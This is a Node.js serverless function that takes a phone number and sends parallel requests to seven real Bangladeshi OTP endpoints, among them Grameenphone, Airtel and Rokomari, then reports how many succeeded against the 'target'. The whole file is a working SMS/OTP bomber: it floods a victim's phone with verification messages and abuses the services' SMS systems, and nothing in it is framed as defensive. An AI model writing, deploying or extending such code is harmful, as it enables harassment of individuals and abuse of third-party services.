const axios = require('axios');

const TIMEOUT = 15000;

function formatPhone(phone) {
  let cleaned = phone.replace(/\D/g, '');
  if (cleaned.startsWith('880')) cleaned = cleaned.slice(3);
  if (cleaned.startsWith('0')) cleaned = cleaned.slice(1);
  return {
    raw: '0' + cleaned,
    with880: '880' + cleaned,
    withPlus880: '+880' + cleaned,
    noLeadingZero: cleaned
  };
}

async function makeRequest(config) {
  try {
    const response = await axios({ timeout: TIMEOUT, validateStatus: () => true, ...config });
    return { success: response.status >= 200 && response.status < 300, status: response.status, data: response.data };
  } catch (error) {
    return { success: false, status: null, error: error.message };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();

  const phone = req.query.phone;
  if (!phone) return res.status(400).json({ error: "Phone number required" });

  const fmt = formatPhone(phone);
  const start = Date.now();

  // API List
  const requests = [
    makeRequest({ method: 'POST', url: 'https://weblogin.grameenphone.com/backend/api/v1/otp', data: { msisdn: fmt.raw } }),
    makeRequest({ method: 'POST', url: 'https://cokestudio23.sslwireless.com/api/check-gp-number', data: { msisdn: fmt.raw } }),
    makeRequest({ method: 'POST', url: 'https://api.osudpotro.com/api/v1/users/send_otp', data: { mobile: '+88-' + fmt.raw, deviceToken: 'web', os: 'web' } }),
    makeRequest({ method: 'POST', url: 'https://apix.rabbitholebd.com/appv2/login/requestOTP', data: { mobile: fmt.withPlus880 } }),
    makeRequest({ method: 'POST', url: 'https://api.bd.airtel.com/v1/account/login/otp', data: { phone_number: fmt.raw } }),
    makeRequest({ method: 'POST', url: 'https://api.swap.com.bd/api/v1/send-otp', data: { phone: fmt.raw } }),
    makeRequest({ method: 'GET', url: `https://www.rokomari.com/otp/send?emailOrPhone=${fmt.with880}&countryCode=BD` })
  ];

  const results = await Promise.all(requests);
  const time = ((Date.now() - start) / 1000).toFixed(1);

  return res.status(200).json({
    target: fmt.raw,
    total: results.length,
    successful: results.filter(r => r.success).length,
    time_seconds: time,
    results: results.map((r, i) => ({ id: i+1, status: r.success }))
  });
};
